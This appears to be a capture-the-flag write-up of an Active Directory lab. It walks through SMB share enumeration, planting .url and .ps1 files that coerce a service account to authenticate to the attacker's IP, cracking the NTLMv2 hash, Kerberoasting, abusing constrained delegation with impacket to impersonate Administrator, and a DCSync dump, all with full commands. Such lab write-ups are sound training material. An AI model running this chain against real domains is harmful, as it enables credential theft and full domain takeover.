## Active Directory CTF Write‑Up ##
This challenge walks through SMB Enumeration -> File-Based Coercion Attack -> Cracking NTLMv2 hash -> abusing AllowedToDelegate privilege to obtain Domain Admin access

# Environment Setup:
machine_IP = 10.114.142.161
Before starting, DNS resolution must point to the Domain Controller. this is critical for Kerberos-based attacks, which we'll need later
<img width="437" height="142" alt="Pasted image 20260828221413" src="https://github.com/user-attachments/assets/f6eef872-4040-46dd-b295-23d76dd120b7" />

# Enumeration 
1. `nmap -sn 10.114.142.0/24 -T4`    to discover live hosts


2. `nmap -sV -sC 10.114.142.161 -oN full_scan.txt`   port scan
<img width="1207" height="807" alt="Pasted image 20260827163857" src="https://github.com/user-attachments/assets/20531676-48fa-4bf6-9772-25fe986577d3" />

	
3. ## SMB Shares Enumeration:
	 - i tried smbmap, nmap's smb_enum_shares, enum4linux-ng -> nothing worked
		then i used smbclient and it worked: 
		`smbclient -L //10.114.142.161/ -N`
		<img width="887" height="281" alt="Pasted image 20260827164709" src="https://github.com/user-attachments/assets/1dd75d6a-fdbb-4780-9168-18b79dabe550" />

	 - then i had to connect to each share -> and discovered that i had read/write access to IT-Shared along with some interesting information:
		`smbclient //10.114.142.161/IT-Shared -N`
		<img width="737" height="430" alt="Pasted image 20260827165154" src="https://github.com/user-attachments/assets/b0a38d0a-3d53-4385-b3a7-574855b035ef" />

		
now since i have write access, and the file share hints that svc.scanner service account enumerates IT-Shared share for new files to process, that indicates a possible "File-Based Coercion Attack".

# Exploitation    "File-Based Coercion Attack"
1. I spin up a listener using responder
	`sudo responder -I tun0`  

2. I tried to upload  @test.url file with this syntax:
	[InternetShortcut]
	URL=http://thm.loc
	WorkingDirectory=thm
	IconFile=\\YOURTUN0IP\icons\icon.ico      
	IconIndex=1
but it didn't trigger authentication

3. I tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
	`Test-Path \\192.168.157.253\icons\icon.ico`
	and in just seconds I intercepted and received an SMB authentication request from svc.scanner account containing his NTLMv2 hash.
   <img width="945" height="277" alt="Pasted image 20260827171310" src="https://github.com/user-attachments/assets/86e241db-a377-46ec-b3cb-e3db8eb7dc64" />


## Cracking the captured NTLMv2 hash:
1. i saved the hash to hash.txt file
2. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force`
 
the password is: 1summerlove!


# Kerberoasting
1. `impacket/GetUserSPNs.py ctf.local/svc.scanner -dc-ip 10.114.142.161 -request`
	I got the TGS-REP blob for svc.mssql

	<img width="1912" height="802" alt="Pasted image 20260827195245" src="https://github.com/user-attachments/assets/9d5a5b25-0d61-48a6-a4e8-f86713d808d8" />

	i tried to crack it using hashcat, but unfortunately, no results

# BloodHound
1. collect information
	`bloodhound-python -c all -u svc.scanner -p 1summerlove! -d ctf.local -ns 10.114.151.84 --zip`

2. run bloodhound & import the zip file
	`bloodhound-start`  login with admin admin and upload the zip file


We found that svc.scanner has a constrained delegation relationship "AllowedToDelegate" with the domain controller
<img width="1917" height="903" alt="Screenshot 2026-08-28 024159" src="https://github.com/user-attachments/assets/0b169dcc-c29e-4440-9d8e-dd0b866e4867" />


# Exploitation   "Privilege Abuse"
"AllowedToDelegate privilege": Allows you to impersonate another user and request a service ticket (TGS) on behalf of him.
so we request a service ticket for CIFS as Administrator.                  CIFS is the service giving the DC file-system access


1. Request a service ticket for CIFS impersonating Administrator 
   `impacket/getST.py ctf.local/svc.scanner -spn cifs/DC01.CTF.LOCAL -impersonate 'Administrator' -dc-ip <DC_IP>` 
	          -this will give us the TGS for CIFS stored in a .ccache file
   <img width="1247" height="222" alt="image" src="https://github.com/user-attachments/assets/a2496d9f-3d6d-4af1-89ea-1f9f71a9c815" />

	
3. we export the KRB5CCNAME to point to the .ccache file, in order to authenticate with this Kerberos ticket with subsequent tools
   `export KRB5CCNAME=<path_to_ccache_file>`
		
4. We used PsExec to authenticate to the DC as Administrator
 `impcket/psexec.py ctf.local/Administrator@DC01.CTG.LOCAL -k -no-pass`
-k: reads from the KRB5CCNAME environment variable
we needed to specify the DC's hostname, because Kerberos relies on DNS hostname resolution
<img width="863" height="335" alt="image" src="https://github.com/user-attachments/assets/3f2a0211-48a1-4a79-acdf-69b43de71d9e" />

Now we navigate to the Administrator desktop and grab the flag


# Going beyond the CTF
we perform a DCSync Attack "dumping the DC's NTDS.dit database"
   `impacket/secretsdump.py ctf.local/Administrator@DC01.CTF.LOCAL -k -no-pass -just-dc -output dc_dump`
<img width="1150" height="747" alt="image" src="https://github.com/user-attachments/assets/5afd1cea-1dbb-4297-b60f-62fd80306851" />
   
